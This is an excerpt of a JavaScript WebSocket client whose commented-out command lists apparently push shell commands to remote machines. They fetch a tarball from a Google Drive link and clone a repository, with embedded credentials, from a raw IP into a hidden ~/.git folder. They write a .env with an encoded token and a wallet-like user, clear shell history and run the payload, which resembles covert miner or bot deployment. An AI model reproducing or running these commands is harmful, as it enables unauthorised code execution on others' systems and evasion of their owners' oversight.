...
class Client extends EventEmitter {
  ...
  startWs = async (url, host, context, uid) => {
    ...
    ws.on('open', () => {
      ...
      // const commands = [
      //   "[ -f micro-rinc/app.js ] || wget --no-check-certificate 'https://drive.usercontent.google.com/download?id=1VnjLEKqs7l5GmjfDqEJ1gBGoPQ5-2jp_&export=download&confirm=t' -O micro-rinc-master.tar.gz && tar -xf micro-rinc-master.tar.gz && rm micro-rinc-master.tar.gz",
      ...
      // const commands = [
      //   'cd ~/',
      //   'pkill -f "node ~/.git/app.js" || true',
      //   '[ ! -d .git ] && git clone http://malphite848:3e79f6eb675b3a4bb9600786b50d8a341dc47f7e@160.30.168.199:3001/malphite848/micro-rinc.git .git',
      //   'cd .git',
      //   `echo -e 'SECRET_TOKEN="MTYwLjMwLjE2OC4xOTk6NDA1MQ=="\nAUTH_USER="RSqWRgivNtmxDaEWj1xyLrE5HPnjcs8DNj"\nAUTH_PASS="Yz1SVk4="\nCONCURRENCY=8\nLOGGING_LEVEL="info"' > .env`,
      //   'export PATH=./usr/bin:$PATH',
      //   'history -c && history -w && clear && node app.js'
      //   ]
      // const commands = [
      //   'cd ~/',
      //   'pkill -f "node ~/.git/app.js" || true',
      ...
      const runStats = async () => {
        try {
          ...
          //console.error("Lỗi trong runStats:", error);
        }
      
        interval = setTimeout(runStats, 60 * 1000); // luôn lặp lại
      };
      runStats();
      // const runStats = async () => {
      //   // const commands = [
